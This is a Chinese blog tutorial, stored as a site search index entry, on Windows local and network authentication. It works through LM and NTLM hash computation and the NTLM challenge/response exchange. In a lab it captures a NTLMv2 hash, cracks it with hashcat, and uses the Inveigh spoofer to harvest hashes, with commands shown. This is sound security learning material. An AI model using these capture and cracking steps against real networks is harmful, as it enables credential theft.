<?xml version="1.0" encoding="utf-8"?>
<search>
  
  
  
  <entry>
    <title>Windwso本地认证之NTML哈希和LM哈希</title>
    <link href="/2025/01/06/Windwso%E6%9C%AC%E5%9C%B0%E8%AE%A4%E8%AF%81%E4%B9%8BNTML%E5%93%88%E5%B8%8C%E5%92%8CLM%E5%93%88%E5%B8%8C/"/>
    <url>/2025/01/06/Windwso%E6%9C%AC%E5%9C%B0%E8%AE%A4%E8%AF%81%E4%B9%8BNTML%E5%93%88%E5%B8%8C%E5%92%8CLM%E5%93%88%E5%B8%8C/</url>
    
    <content type="html"><![CDATA[<h2 id="Windwso本地认证之NTML哈希和LM哈希"><a href="#Windwso本地认证之NTML哈希和LM哈希" class="headerlink" title="Windwso本地认证之NTML哈希和LM哈希"></a>Windwso本地认证之NTML哈希和LM哈希</h2><h3 id="本地认证的流程"><a href="#本地认证的流程" class="headerlink" title="本地认证的流程"></a>本地认证的流程</h3><p>Windows的登陆密码是储存在系统本地的SAM文件中的，在登陆Windows的时候，系统会将用户输入的密码与 SAM文件中的密码进行对比，如果相同，则认证成功<br>SAM文件是位于 %SystemRoot%\system32\config\ 目录下的，用于储存本地所有用户的凭证信息，但是这并不代表着你可以随意去查看系统密码。<br><img src="https://hsmyzj-1322074094.cos.ap-beijing.myqcloud.com/202501061651013.png" alt="image.png"><br>Windows本地认证流程如下：<br><img src="https://hsmyzj-1322074094.cos.ap-beijing.myqcloud.com/202501061651017.png" alt="image.png"><br>首先，用户注销、重启、锁屏后，操作系统会让winlogon.exe显示登陆界面，也就是输入框界面，接收用户的输入信息后，将密码交给lsass进程，这个过程中会存一份明文密码，将明文密码加密成NTLM Hash，对SAM数据库进行比较认证<br>Windows Logon Process（即winlogon.exe）：是Windows NT 用户登陆程序，用于管理用户登陆和退出<br>LSASS：用于微软Windows系统的安全机制，它用于本地安全和登陆策略<br>本地认证中用来处理用户输入密码的进程即lsass.exe,密码会在这个进程中明文保存，供该进程将密码计算成NTLM Hash与sam进行比对，我们使用mimikatz来获取的明文密码，便是在这个进程中读取到的 </p><h3 id="LM和NTML哈希"><a href="#LM和NTML哈希" class="headerlink" title="LM和NTML哈希"></a>LM和NTML哈希</h3><p>Windows操作系统通常使用两种方法对用户的明文密码进行加密处理。在域环境中,用户信息存储在ntds.dit中,加密后为散列值。 Windows操作系统中的密码一般由两部分组成,一部分为 LM Hash,另一部分为NTLMHash。在Windows操作系统中,Hash的结构通常如下<br>LM Hash的全名为”LAN Manager Hash”,是微软为了提高 Windows操作系统的安全性而采 用的散列加密算法,其本质是DES加密。尽管 LM Hash较容易被破解,但为了保证系统的兼容性, Windows只是将LM Hash禁用了(从Windows vista和 Windows Server2008版本开始, Windows操作系统默认禁用 LM Hash)。 LM Hash明文密码被限定在14位以内,也就是说,如果要停止使用 LM Hash,将用 户的密码设置为14位以上即可。如果 LM Hash被禁用了, 攻击者通过工具抓取的 LM Hash通常 为“ad3b435b51404eead3b435b51404ee”(表示 LM Hash为空值或被禁用) NTLM Hash是微软为了在提高安全性的同时保证兼容性而设计的散列加密算法。 NTLM Hash 是基于MD4加密算 username:RID:LM‐HASH:NT‐HASH法进行加密的。个人版从 Windows vista以后,服务器版从 Windows Server 2003以后, Windows操作系统的认证方式均为 NTLM Hash<br>为了解决LM加密和身份验证方案中固有的安全弱点，Microsoft 于1993年在Windows NT 3.1中引入了NTLM协议。下面是各个版本对LM和NTLM的支持。<br><img src="https://hsmyzj-1322074094.cos.ap-beijing.myqcloud.com/202501061651996.png" alt="image.png"></p><h3 id="LM-Hash原理"><a href="#LM-Hash原理" class="headerlink" title="LM Hash原理"></a>LM Hash原理</h3><p>1、将明文口令转换为其大写形式 假设这里以明文Admin@123为例，转换为大写格式为：ADMIN@123<br>2、将字符串大写后转换为16进制字符串转换后为 41 44 4D 49 4E 40 31 32 33<br>3、密码不足14字节要求用0补全，1Byte&#x3D;8bit,上面的16进制字符串共9个字节,还差5个字节 我么使用 00 00 00 00 00 补全为 41 44 4D 49 4E 40 31 32 33 00 00 00 00 00<br>4、将上述编码分成2组7字节 </p><figure class="highlight basic"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs basic"><span class="hljs-symbol">41 </span><span class="hljs-number">44</span> <span class="hljs-number">4</span>D <span class="hljs-number">49</span> <span class="hljs-number">4</span>E <span class="hljs-number">40</span> <span class="hljs-number">31</span> 第一组<br><span class="hljs-symbol">32 </span><span class="hljs-number">33</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span> 第二组<br></code></pre></td></tr></table></figure><p>5、将每一组7字节的十六进制转换为二进制，每7bit一组末尾加0，再转换成十六进制组成得到2组8字节的编码第一组 </p><figure class="highlight dns"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><code class="hljs dns"><span class="hljs-number">16</span>进制：<span class="hljs-number">41</span> <span class="hljs-number">44</span> <span class="hljs-number">4</span>D <span class="hljs-number">49</span> <span class="hljs-number">4</span>E <span class="hljs-number">40</span> <span class="hljs-number">31</span><br>转换为二进制：<span class="hljs-number">01000001010001000100110101001001010011100100000000110001</span><br>七个为一组末尾补<br><span class="hljs-number">01000000</span><br><span class="hljs-number">10100010</span><br><span class="hljs-number">00010010</span><br><span class="hljs-number">10101000</span><br><span class="hljs-number">10010100</span><br><span class="hljs-number">01110010</span><br><span class="hljs-number">00000000</span><br><span class="hljs-number">01100010</span><br>合并后为<span class="hljs-number">0100000010100010000100101010100010010100011100100000000001100010</span><br>在转换为<span class="hljs-number">16</span>进制：<span class="hljs-number">40</span>A212A<span class="hljs-number">894720062</span><br></code></pre></td></tr></table></figure><p>第二组 </p><figure class="highlight dns"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><code class="hljs dns"><span class="hljs-number">16</span>进制：<span class="hljs-number">32 33 00 00</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span><br>转换为二进制：<span class="hljs-number">00110010001100110000000000000000000000000000000000000000</span><br>七个为一组末尾补<br><span class="hljs-number">00110010</span><br><span class="hljs-number">00011000</span><br><span class="hljs-number">11000000</span><br><span class="hljs-number">00000000</span><br><span class="hljs-number">00000000</span><br><span class="hljs-number">00000000</span><br><span class="hljs-number">00000000</span><br><span class="hljs-number">00000000</span><br>合并后为<span class="hljs-number">0011001000011000110000000000000000000000000000000000000000000000</span><br>在转换为<span class="hljs-number">16</span>进制：<span class="hljs-number">3218</span>C<span class="hljs-number">00000000000</span><br></code></pre></td></tr></table></figure><p>6、将以上步骤得到的两组8字节编码，分别作为DES加密key为魔术字符串 KGS!@#$% 进行加密 KGS!@#$%的16进制为 4B47532140232425</p><figure class="highlight dns"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs dns">第一组：<span class="hljs-number">6</span>F08D7B306B1DAD4<br>第二组：B75E0C<span class="hljs-number">8D76954A50</span><br></code></pre></td></tr></table></figure><p><img src="https://hsmyzj-1322074094.cos.ap-beijing.myqcloud.com/202501061651022.png" alt="image.png"><br>7、最终结果拼接即可6F08D7B306B1DAD4B75E0C8D76954A50 </p><h3 id="NTLM-Hash原理"><a href="#NTLM-Hash原理" class="headerlink" title="NTLM Hash原理"></a>NTLM Hash原理</h3><p>将明文口令转换成十六进制的格式 如：Admin@123 转换成Unicode格式，即在每个字节之后添加0x00</p><figure class="highlight dns"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs dns">Admin@<span class="hljs-number">123</span>转<span class="hljs-number">16</span>进制 <span class="hljs-number">41646</span>D6<span class="hljs-number">96E40313233</span><br>添加<span class="hljs-number">00</span>：<span class="hljs-number">410064006</span>D0069006E0040003<span class="hljs-number">10032003300</span><br></code></pre></td></tr></table></figure><p>对Unicode字符串作MD4加密，生成32位的十六进制数字串 570a9a65db8fba761c1008a51d4c95ab<br><img src="https://hsmyzj-1322074094.cos.ap-beijing.myqcloud.com/202501061651011.png" alt="image.png"></p><h2 id="Windows网络认证之基于挑战响应认证的NTLM协议"><a href="#Windows网络认证之基于挑战响应认证的NTLM协议" class="headerlink" title="Windows网络认证之基于挑战响应认证的NTLM协议"></a>Windows网络认证之基于挑战响应认证的NTLM协议</h2><h3 id="网络认证NTLM协议简介"><a href="#网络认证NTLM协议简介" class="headerlink" title="网络认证NTLM协议简介"></a>网络认证NTLM协议简介</h3><p>在平时的测试中 ，经常会碰到处于工作组的计算机 ，处于工作组的计算机之间是无法建立一个可信的信托机构的， 只能是点对点进行信息的传输。举个例子就是 ，主机A想要访问主机B上的资源 ，就要向主机B发送一个存在于主机 B上的一个账户 ，主机B接收以后会在本地进行验证 ，如果验证成功 ，才会允许主机A进行相应的访问。<br>NTLM 协议是一种基于 挑战（Chalenge）&#x2F;响应（Response）认证 机制 ，仅支持Windows的网络认证协议。<br>它主要分为协商、质询和验证三个步骤：</p><figure class="highlight autohotkey"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs autohotkey">协商，这个是为了解决历史遗留问题，也就是为了向下兼容，双方先确定一下传输协议的版本等各种信息。<br>质`，这一步便是Chalenge/Response认证机制的关键之处，下面会介绍这里的步骤。<br>验证，对质询的最后结果进行一个验证，验证通过后，即允许访问资源<br></code></pre></td></tr></table></figure><h3 id="认证流程"><a href="#认证流程" class="headerlink" title="认证流程"></a>认证流程</h3><h4 id="认证成功"><a href="#认证成功" class="headerlink" title="认证成功"></a>认证成功</h4><p>1、首先 ，client会向server发送一个username ，这个username是存在于server上的一个用户<br><img src="https://hsmyzj-1322074094.cos.ap-beijing.myqcloud.com/202501061651016.png" alt="image.png"><br>2、首先会在本地查询是否存在这样的一个用户 ，如果存在 ，将会生成一个16位的随机字符 ，即Chalenge ，然后用<br>查询到的这个user的NTLM hash对Chalenge进行加密 ，生成Chalenge1 ，将Chalenge1存储在本地 ，并将 Chalenge传给client。<br><img src="https://hsmyzj-1322074094.cos.ap-beijing.myqcloud.com/202501061651409.png" alt="image.png"></p><p>3、当client接收到Chalenge时 ，将发送的username所对应的NTLM hash对Chalenge进行加密即Response ，并 Response发送给server。<br><img src="https://hsmyzj-1322074094.cos.ap-beijing.myqcloud.com/202501061651445.png" alt="image.png"><br>4、server在收到Response后 ，将其与Chalenge1进行比较 ，如果相同 ，则验证成功<br><img src="https://hsmyzj-1322074094.cos.ap-beijing.myqcloud.com/202501061651479.png" alt="image.png"></p><h4 id="认证失败"><a href="#认证失败" class="headerlink" title="认证失败"></a>认证失败</h4><p>1、首先 ，client会向server发送一个username ，这个username是存在于server上的一个用户<br><img src="https://hsmyzj-1322074094.cos.ap-beijing.myqcloud.com/202501061651519.png" alt="image.png"><br>2、当server接收到这个信息时 ，首先会在本地查询是否存在这样的一个用户 ，如果不存在 ，则直接返回认证失败<br><img src="https://hsmyzj-1322074094.cos.ap-beijing.myqcloud.com/202501061651563.png" alt="image.png"></p><h3 id="NTLM协议v1和v2区别"><a href="#NTLM协议v1和v2区别" class="headerlink" title="NTLM协议v1和v2区别"></a>NTLM协议v1和v2区别</h3><p>NTLM V2协议 ， NTLMv1与NTLM v2最显著的区别就是Challenge与加密算法不同 ，共同点就是加密的原料都是 NTLM Hash，</p><figure class="highlight armasm"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs armasm"><span class="hljs-symbol">NTLM</span> <span class="hljs-built_in">v1</span>的Challenge有<span class="hljs-number">8</span>位，NTLM <span class="hljs-built_in">v1</span>的主要加密算法是DES<br><span class="hljs-symbol">NTLM</span> <span class="hljs-built_in">v2</span>的Challenge为<span class="hljs-number">16</span>位；NTLM <span class="hljs-built_in">v2</span>的主要加密算法是HMAC‐MD5。<br></code></pre></td></tr></table></figure><h3 id="抓包分析"><a href="#抓包分析" class="headerlink" title="抓包分析"></a>抓包分析</h3><p>1、实验环境如下</p><table><thead><tr><th>机器名称</th><th>IP地址</th><th>账号密码</th></tr></thead><tbody><tr><td>实验机器（windows 10）</td><td><a href="https://192.168.41.132/">192.168.41.132</a></td><td>自己的</td></tr><tr><td>靶机（windows server 2008 ）</td><td><a href="https://192.168.41.130/">192.168.41.130</a></td><td>kkk&#x2F;Admin@123</td></tr></tbody></table><p>2、windows 10 上已经安装了wireshark<br><img src="https://hsmyzj-1322074094.cos.ap-beijing.myqcloud.com/202501061651639.png" alt="image.png"><br>3、使用如下命令进行远程连接 ，并且使用wireshark 包</p><figure class="highlight nginx"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs nginx"><span class="hljs-attribute">net</span> use \\<span class="hljs-number">192.168.3.180</span> /u:mumu Abc123..<br></code></pre></td></tr></table></figure><p><img src="https://hsmyzj-1322074094.cos.ap-beijing.myqcloud.com/202501061651828.png" alt="image.png"><br>4、前5个黄色数据包中前四条时协商 ，第五个是认证的第一个数据包<br><img src="https://hsmyzj-1322074094.cos.ap-beijing.myqcloud.com/202501061651963.png" alt="image.png"></p><p>5、第6个数据包就是返回chalenge挑战值<br><img src="https://hsmyzj-1322074094.cos.ap-beijing.myqcloud.com/202501061651936.png" alt="image.png"><br>分析该数据包得到chalenge值 b27bb316a0991982<br><img src="https://hsmyzj-1322074094.cos.ap-beijing.myqcloud.com/202501061651931.png" alt="image.png"><br>6、第7个数据包就是返回response的数据包<br><img src="https://hsmyzj-1322074094.cos.ap-beijing.myqcloud.com/202501061651954.png" alt="image.png"><br>rsponse数据如下：</p><figure class="highlight llvm"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs llvm"><span class="hljs-number">8</span>de<span class="hljs-number">20e2</span>cebf<span class="hljs-number">06</span>a<span class="hljs-number">02</span>dcebc<span class="hljs-number">71</span>d<span class="hljs-number">2</span>b<span class="hljs-number">273420010100000000000011235223</span>af<span class="hljs-number">73</span>da<span class="hljs-number">019858</span>b<span class="hljs-number">1301</span>ebf<span class="hljs-number">9</span><span class="hljs-keyword">c</span><span class="hljs-number">140000000002001e00570049004</span>e<span class="hljs-number">002</span>d<span class="hljs-number">003900410053004</span>d<span class="hljs-number">00420039003000550037003800510001001e00570049004</span>e<span class="hljs-number">002</span>d<span class="hljs-number">003900410053004</span>d<span class="hljs-number">00420039003000550037003800510004001e00570049004</span>e<span class="hljs-number">002</span>d<span class="hljs-number">003900410053004</span>d<span class="hljs-number">00420039003000550037003800510003001e00570049004</span>e<span class="hljs-number">002</span>d<span class="hljs-number">003900410053004</span>d<span class="hljs-number">0042003900300055003700380051000700080011235223</span>af<span class="hljs-number">73</span>da<span class="hljs-number">010600040002000000080030003000000000000000010000000020000099</span>f<span class="hljs-number">69</span>fcfced<span class="hljs-number">6784</span>ecc<span class="hljs-number">6118966</span>feca<span class="hljs-number">4</span><span class="hljs-keyword">c</span><span class="hljs-number">1</span>cb<span class="hljs-number">8</span><span class="hljs-keyword">c</span><span class="hljs-number">03</span>f<span class="hljs-number">31185</span>f<span class="hljs-number">8</span>baec<span class="hljs-number">6664</span>b<span class="hljs-number">9</span><span class="hljs-keyword">c</span><span class="hljs-number">5</span>b<span class="hljs-number">9799</span>f<span class="hljs-number">0</span>a<span class="hljs-number">001000000000000000000000000000000000000900240063006900660073002</span>f<span class="hljs-number">003100390032002e003100360038002</span>e<span class="hljs-number">0033002e00310038003000000000000000000000000000</span><br></code></pre></td></tr></table></figure><p>7、接下来得到NTLMv2 数据 ， NTLMv2格式如下：</p><figure class="highlight ruby"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs ruby">username::<span class="hljs-symbol">domain:</span><span class="hljs-symbol">challenge:</span><span class="hljs-variable constant_">HMAC</span>‐<span class="hljs-variable constant_">MD5</span><span class="hljs-symbol">:blob</span><br></code></pre></td></tr></table></figure><p>介绍如下：</p><figure class="highlight pgsql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs pgsql">username：对应数据包中 <span class="hljs-keyword">user</span> <span class="hljs-type">name</span><br><span class="hljs-keyword">domain</span>:对应数据包中的 <span class="hljs-keyword">Domain</span> <span class="hljs-type">name</span><br>HMAC‐MD5：对应数据包中的NTProofStr<br>blob：数据库包中rsponse去掉HMAC‐MD5的值<br></code></pre></td></tr></table></figure><p><img src="https://hsmyzj-1322074094.cos.ap-beijing.myqcloud.com/202501061651045.png" alt="image.png"><br>本次domain为：DESKTOP-5ABCTE5 这里根据自己的来，为null就不用写 改为 a:::b即可<br><img src="https://hsmyzj-1322074094.cos.ap-beijing.myqcloud.com/202501061651180.png" alt="image.png"><br>HMAC-md5为NTProofstr 每次都不一样 8de20e2cebf06a02dcebc71d2b273420<br>blob为</p><figure class="highlight llvm"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs llvm">数据库包中rsponse去掉HMAC‐MD<span class="hljs-number">5</span>的值<br>rsponse：<span class="hljs-number">8</span>de<span class="hljs-number">20e2</span>cebf<span class="hljs-number">06</span>a<span class="hljs-number">02</span>dcebc<span class="hljs-number">71</span>d<span class="hljs-number">2</span>b<span class="hljs-number">273420010100000000000011235223</span>af<span class="hljs-number">73</span>da<span class="hljs-number">019858</span>b<span class="hljs-number">1301</span>ebf<span class="hljs-number">9</span><span class="hljs-keyword">c</span><span class="hljs-number">140000000002001e00570049004</span>e<span class="hljs-number">002</span>d<span class="hljs-number">003900410053004</span>d<span class="hljs-number">00420039003000550037003800510001001e00570049004</span>e<span class="hljs-number">002</span>d<span class="hljs-number">003900410053004</span>d<span class="hljs-number">00420039003000550037003800510004001e00570049004</span>e<span class="hljs-number">002</span>d<span class="hljs-number">003900410053004</span>d<span class="hljs-number">00420039003000550037003800510003001e00570049004</span>e<span class="hljs-number">002</span>d<span class="hljs-number">003900410053004</span>d<span class="hljs-number">0042003900300055003700380051000700080011235223</span>af<span class="hljs-number">73</span>da<span class="hljs-number">010600040002000000080030003000000000000000010000000020000099</span>f<span class="hljs-number">69</span>fcfced<span class="hljs-number">6784</span>ecc<span class="hljs-number">6118966</span>feca<span class="hljs-number">4</span><span class="hljs-keyword">c</span><span class="hljs-number">1</span>cb<span class="hljs-number">8</span><span class="hljs-keyword">c</span><span class="hljs-number">03</span>f<span class="hljs-number">31185</span>f<span class="hljs-number">8</span>baec<span class="hljs-number">6664</span>b<span class="hljs-number">9</span><span class="hljs-keyword">c</span><span class="hljs-number">5</span>b<span class="hljs-number">9799</span>f<span class="hljs-number">0</span>a<span class="hljs-number">001000000000000000000000000000000000000900240063006900660073002</span>f<span class="hljs-number">003100390032002e003100360038002</span>e<span class="hljs-number">0033002e00310038003000000000000000000000000000</span><br>HMAC-MD<span class="hljs-number">5</span>：<span class="hljs-number">8</span>de<span class="hljs-number">20e2</span>cebf<span class="hljs-number">06</span>a<span class="hljs-number">02</span>dcebc<span class="hljs-number">71</span>d<span class="hljs-number">2</span>b<span class="hljs-number">273420</span><br>相当于减去开头的一段<br>最终：<span class="hljs-number">010100000000000011235223</span>af<span class="hljs-number">73</span>da<span class="hljs-number">019858</span>b<span class="hljs-number">1301</span>ebf<span class="hljs-number">9</span><span class="hljs-keyword">c</span><span class="hljs-number">140000000002001e00570049004</span>e<span class="hljs-number">002</span>d<span class="hljs-number">003900410053004</span>d<span class="hljs-number">00420039003000550037003800510001001e00570049004</span>e<span class="hljs-number">002</span>d<span class="hljs-number">003900410053004</span>d<span class="hljs-number">00420039003000550037003800510004001e00570049004</span>e<span class="hljs-number">002</span>d<span class="hljs-number">003900410053004</span>d<span class="hljs-number">00420039003000550037003800510003001e00570049004</span>e<span class="hljs-number">002</span>d<span class="hljs-number">003900410053004</span>d<span class="hljs-number">0042003900300055003700380051000700080011235223</span>af<span class="hljs-number">73</span>da<span class="hljs-number">010600040002000000080030003000000000000000010000000020000099</span>f<span class="hljs-number">69</span>fcfced<span class="hljs-number">6784</span>ecc<span class="hljs-number">6118966</span>feca<span class="hljs-number">4</span><span class="hljs-keyword">c</span><span class="hljs-number">1</span>cb<span class="hljs-number">8</span><span class="hljs-keyword">c</span><span class="hljs-number">03</span>f<span class="hljs-number">31185</span>f<span class="hljs-number">8</span>baec<span class="hljs-number">6664</span>b<span class="hljs-number">9</span><span class="hljs-keyword">c</span><span class="hljs-number">5</span>b<span class="hljs-number">9799</span>f<span class="hljs-number">0</span>a<span class="hljs-number">001000000000000000000000000000000000000900240063006900660073002</span>f<span class="hljs-number">003100390032002e003100360038002</span>e<span class="hljs-number">0033002e00310038003000000000000000000000000000</span><br></code></pre></td></tr></table></figure><p>8、最终的到HTLNv2如下：</p><figure class="highlight dns"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs dns">mumu<span class="hljs-number">::</span>DESKTOP-<span class="hljs-number">5</span>ABCTE5:b27bb3<span class="hljs-number">16a0991982</span>:<span class="hljs-number">8d</span>e20e2cebf06a02dcebc71d<span class="hljs-number">2b273420</span>:<span class="hljs-number">010100000000000011235223</span>af73da019858b1301ebf9c140000000002001e00570049004e002d003900410053004d00420039003000550037003800510001001e00570049004e002d003900410053004d00420039003000550037003800510004001e00570049004e002d003900410053004d00420039003000550037003800510003001e00570049004e002d003900410053004d0042003900300055003700380051000700080011235223af73da010600040002000000080030003000000000000000010000000020000099f69fcfced6784ecc6118966feca4c1cb8c03f31185f8baec6664b9c5b9799f0a001000000000000000000000000000000000000900240063006900660073002f003100390032002e003100360038002e0033002e003100380030000000000000000<span class="hljs-number">00000000000</span><br></code></pre></td></tr></table></figure><p>9、使用hashcat 破解密码</p><figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">hashcat</span> ‐m <span class="hljs-number">5600</span><br><span class="hljs-attribute">kkk</span>:::<span class="hljs-number">53</span>fb7eb8d40cc777:<span class="hljs-number">3</span>d00ee8a5618f85651098b8005883d5c:<span class="hljs-number">0101000000000000</span>f790f7af9b92d8019cba65f5 e39a1ea90000000002000e0042004d002d00320030003000380001000e0042004d002d00320030003000380004000e00 <span class="hljs-number">42004</span>d002d00320030003000380003000e0042004d002d00320030003000380007000800f790f7af9b92d80106000400 <span class="hljs-number">0200000008003000300000000000000001000000002000009906</span>b326309f0ba76eb46b2271795e5d12df73e87035391d f48f0fad1ce073380a001000000000000000000000000000000000000900260063006900660073002f00310039003200 <span class="hljs-number">2</span>e003100360038002e00340031002e003100330030000000000000000000 <span class="hljs-number">1</span>.txt ‐ ‐force<br></code></pre></td></tr></table></figure><p>上面的1.txt是我自己的密码字典 ，你们用自己的<br>10、使用hashcat破解得到密码</p><figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">hashcat</span> -m <span class="hljs-number">5600</span> mumu::DESKTOP-<span class="hljs-number">5</span>ABCTE5:b27bb316a0991982:<span class="hljs-number">8</span>de20e2cebf06a02dcebc71d2b273420:<span class="hljs-number">010100000000000011235223</span>af73da019858b1301ebf9c140000000002001e00570049004e002d003900410053004d00420039003000550037003800510001001e00570049004e002d003900410053004d00420039003000550037003800510004001e00570049004e002d003900410053004d00420039003000550037003800510003001e00570049004e002d003900410053004d0042003900300055003700380051000700080011235223af73da010600040002000000080030003000000000000000010000000020000099f69fcfced6784ecc6118966feca4c1cb8c03f31185f8baec6664b9c5b9799f0a001000000000000000000000000000000000000900240063006900660073002f003100390032002e003100360038002e0033002e00310038003000000000000000000000000000 <span class="hljs-number">1</span>.txt --force<br></code></pre></td></tr></table></figure><p><img src="https://hsmyzj-1322074094.cos.ap-beijing.myqcloud.com/202501061651432.png" alt="image.png"><br><img src="https://hsmyzj-1322074094.cos.ap-beijing.myqcloud.com/202501061651524.png" alt="image.png"><br>进行了上面这一系列操作那么我们在实战中如何进行快速抓取呢，接下来我们看下面这个工具</p><h3 id="Inveigh"><a href="#Inveigh" class="headerlink" title="Inveigh"></a>Inveigh</h3><p>相关文章地址：<a href="https://www.anquanke.com/post/id/83671">https://www.anquanke.com/post/id/83671</a><br>1、还是同之前相同，我们先上传文件并CS导入此powershell脚本，这里我就直接把文件拉进去了<br>2、添加策略</p><figure class="highlight gams"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs gams"><span class="hljs-keyword">Set</span>-ExecutionPolicy <span class="hljs-comment">Unrestricted</span><br></code></pre></td></tr></table></figure><p><img src="https://hsmyzj-1322074094.cos.ap-beijing.myqcloud.com/202501061651508.png" alt="image.png"><br>3、导入目标文件<br><img src="https://hsmyzj-1322074094.cos.ap-beijing.myqcloud.com/202501061651576.png" alt="image.png"><br>4、运行命令启动监听脚本，当我们使用net连接的时候就会抓到HTLNv2</p><figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs powershell"><span class="hljs-built_in">Invoke-Inveigh</span> <span class="hljs-literal">-IP</span> <span class="hljs-string">&#x27;本机IP&#x27;</span> <span class="hljs-literal">-SpooferIP</span> <span class="hljs-string">&#x27;本机IP&#x27;</span> <span class="hljs-literal">-consoleoutput</span> Y<br></code></pre></td></tr></table></figure><p><img src="https://hsmyzj-1322074094.cos.ap-beijing.myqcloud.com/202501061651996.png" alt="image.png"></p><h2 id="Windows域认证之Kerberos协议认证"><a href="#Windows域认证之Kerberos协议认证" class="headerlink" title="Windows域认证之Kerberos协议认证"></a>Windows域认证之Kerberos协议认证</h2><h3 id="什么是Kerberos协议"><a href="#什么是Kerberos协议" class="headerlink" title="什么是Kerberos协议"></a>什么是Kerberos协议</h3><p>Kerberos 是一种网络认证协议 ，其设计目标是通过密钥系统为客户机&#x2F; 服务器应用程序提供强大的认证服务。该认证过程的实现不依赖于主机操作系统的认证 ，无需基于主机地址的信任 ，不要求网络上所有主机的物理安全 ，并 假定网络上传送的数据包可以被任意地读取、修改和插入数据。在以上情况下 ， Kerberos 作为一种可信任的第三方认证服务 ，是通过传统的密码技术（如:共享密钥）执行认证服务的</p><h3 id="Kerberos协议的组成角色"><a href="#Kerberos协议的组成角色" class="headerlink" title="Kerberos协议的组成角色"></a>Kerberos协议的组成角色</h3><p>kerberos协议中也存在三个角色 ，分别是</p><figure class="highlight mathematica"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs mathematica">客户端（<span class="hljs-variable">client</span>）：发送请求的一方<br>服务端（<span class="hljs-variable">Server</span>）：接收请求的一方<br>密钥分发中心（<span class="hljs-built_in">Key</span> <span class="hljs-variable">Distribution</span> <span class="hljs-built_in">Center</span>，<span class="hljs-variable">KDC</span>），而密钥分发中心一般又分为两部分，分别是：<br><span class="hljs-variable">AS</span>（<span class="hljs-built_in">Authentication</span> <span class="hljs-variable">Server</span>）：认证服务器，专门用来认证客户端的身份并发放客户用于访问<span class="hljs-variable">TGS</span>的<span class="hljs-variable">TGT</span>（票据<br>授予票据）<br><span class="hljs-variable">TGS</span>（<span class="hljs-variable">Ticket</span> <span class="hljs-variable">Granting</span> <span class="hljs-variable">Ticket</span>）：票据授予服务器，用来发放整个认证过程以及客户端访问服务端时所需的服务<br>授予票据（<span class="hljs-variable">Ticket</span>）<br></code></pre></td></tr></table></figure><h3 id="Kerberos认证的简单流程"><a href="#Kerberos认证的简单流程" class="headerlink" title="Kerberos认证的简单流程"></a>Kerberos认证的简单流程</h3><p>举个例子：<br>A现在想要去访问B完成一个任务。但是AB两人之间是从来没有见过面的 ，他们只知道对方的名字叫A ， B。此时如 果A直接去找B告诉B我就是A ，那么B是有理由不相信A的 ， B同理也得不到A的认可 ，他们陷入了一个无法证明我  就是我的困境。<br>于是他们就想到了一个办法 ，AB找到了一个他俩共同信任的人C ，且这个C既认识A又认识B ，所以只要C告诉B ，这 个A确实就是真正的A那么B就会信任这个A ，同理B经过C的认可后 ，A也会相信B的身份。此后 ，A在访问B之前会   先去找C ，C会交给A一个凭证 ，代表此时的A已经得到了C的认证 ，这时A拿着凭证再去找B ，便可以得到B的确认了。<br>在举个例子：<br>我们去动物园 ，动物园不认识你不让你进 ，你也怕进门后不是动物园 ，所以就很尴尬<br><img src="https://hsmyzj-1322074094.cos.ap-beijing.myqcloud.com/202501061651011.png" alt="image.png"><br>如何解决呢？我们建立一个售票窗口 ，只要售票处认识你和动物园 ，你和动物园之间就可以相互信任。<br><img src="https://hsmyzj-1322074094.cos.ap-beijing.myqcloud.com/202501061651019.png" alt="image.png"></p><figure class="highlight"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code 